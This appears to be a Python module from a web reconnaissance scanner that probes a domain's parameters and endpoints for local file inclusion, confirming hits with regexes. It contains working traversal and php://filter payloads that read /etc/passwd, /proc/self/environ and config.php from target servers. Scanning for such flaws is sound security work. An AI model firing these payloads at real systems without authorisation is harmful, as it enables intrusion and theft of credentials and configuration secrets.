"""shadowrecon/modules/mod_lfi_probe.py — LFI / path traversal detection."""

import re
from modules._http import http_get

# Payloads: (payload, confirmation_regex)
LFI_PAYLOADS = [
    # Unix /etc/passwd
    ("../../../../../../../etc/passwd",          r"root:.*:/bin/(?:bash|sh)"),
    ("....//....//....//etc/passwd",             r"root:.*:/bin/(?:bash|sh)"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", r"root:.*:/bin/(?:bash|sh)"),
    ("..%2f..%2f..%2fetc%2fpasswd",             r"root:.*:/bin/(?:bash|sh)"),
    ("%252e%252e%252f%252e%252e%252fetc%252fpasswd", r"root:.*:/bin"),
    ("..%c0%afetc%c0%afpasswd",                 r"root:.*:/bin"),
    ("/etc/passwd",                              r"root:.*:/bin"),
    # Windows
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                                                 r"localhost|127\.0\.0\.1"),
    ("..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
                                                 r"localhost|127\.0\.0\.1"),
    # Log poisoning indicator
    ("/proc/self/environ",                       r"HTTP_|PATH=|USER="),
    ("/proc/self/fd/0",                          r""),
    # PHP wrappers
    ("php://filter/read=convert.base64-encode/resource=index.php", r"[A-Za-z0-9+/]{40,}={0,2}"),
    ("php://filter/convert.base64-encode/resource=../config.php",  r"[A-Za-z0-9+/]{40,}={0,2}"),
]

# Parameters commonly vulnerable to LFI
LFI_PARAMS = [
    "file", "page", "path", "include", "require", "template", "view",
    "load", "read", "dir", "folder", "document", "root", "pg", "style",
    "pdf", "layout", "conf", "content", "data", "filename", "module",
    "lang", "language", "locale", "sec", "show", "source", "action",
    "log", "logfile",
]

# Wayback-sourced parameters are also probed (from state.module_results)


def run(domain, args, out, state):
    result = {"vulnerable": [], "issues": []}

    if args.passive_only:
        out.info("Skipped (passive-only mode)")
        return result

    # Build probe targets from discovered endpoints + parameters
    base_targets = [f"https://{domain}", f"http://{domain}"]
    for s in state.subdomains[:6]:
        base_targets.append(f"https://{s['host']}")

    # Grab historical params from wayback
    wb_params = set(
        state.module_results.get("wayback", {}).get("parameters", [])
    )
    probe_params = list(dict.fromkeys(LFI_PARAMS + list(wb_params)))[:40]

    # Also probe endpoints that have known file-related param names
    api_endpoints = [ep for ep in state.endpoints
                     if any(kw in ep.lower() for kw in
                            ("file", "page", "path", "include", "template", "view", "load"))]

    out.info(f"LFI probe: {len(probe_params)} params × {len(base_targets)} targets "
             f"+ {len(api_endpoints)} JS endpoints × {len(LFI_PAYLOADS)} payloads")

    found = set()

    def _probe(url_base: str, param: str, payload: str, confirm_re: str):
        url = f"{url_base}?{param}={payload}"
        r   = http_get(url, timeout=args.timeout, allow_redirects=True)
        if not r or not r.text:
            return
        body = r.text
        if confirm_re and re.search(confirm_re, body, re.IGNORECASE):
            key = (url_base, param)
            if key not in found:
                found.add(key)
                out.finding("CRITICAL",
                            f"LFI CONFIRMED: {url_base}?{param}={payload[:40]}",
                            cwe="CWE-22", module="lfi_probe", url=url,
                            evidence=body[:200])
                result["vulnerable"].append({
                    "url":     url,
                    "param":   param,
                    "payload": payload,
                    "confirm": confirm_re,
                })
                result["issues"].append({
                    "severity": "CRITICAL",
                    "cwe":      "CWE-22",
                    "desc":     f"LFI: {url_base}?{param}= — file content confirmed",
                })
        elif r.status_code == 200 and len(body) > 500:
            # No regex match but large 200 — heuristic: check for /etc/-like content
            if "root:" in body or "daemon:" in body or "[boot loader]" in body:
                out.finding("HIGH",
                            f"LFI possible (heuristic): {url_base}?{param}={payload[:40]}",
                            cwe="CWE-22", module="lfi_probe", url=url)

    import concurrent.futures
    work = []
    for base in base_targets:
        for param in probe_params[:15]:
            for payload, confirm in LFI_PAYLOADS[:8]:
                work.append((base, param, payload, confirm))

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = [ex.submit(_probe, *w) for w in work]
        concurrent.futures.wait(futures)

    # Also probe discovered API endpoints directly
    for ep in api_endpoints[:10]:
        for payload, confirm in LFI_PAYLOADS[:4]:
            for base in base_targets[:1]:
                url = f"{base}{ep}"
                r   = http_get(f"{url}?file={payload}", timeout=args.timeout)
                if r and confirm and re.search(confirm, r.text or "", re.IGNORECASE):
                    out.finding("CRITICAL",
                                f"LFI on API endpoint: {url}?file={payload[:40]}",
                                cwe="CWE-22", module="lfi_probe", url=url)

    if not result["vulnerable"]:
        out.success("No LFI vulnerabilities confirmed")
    return result
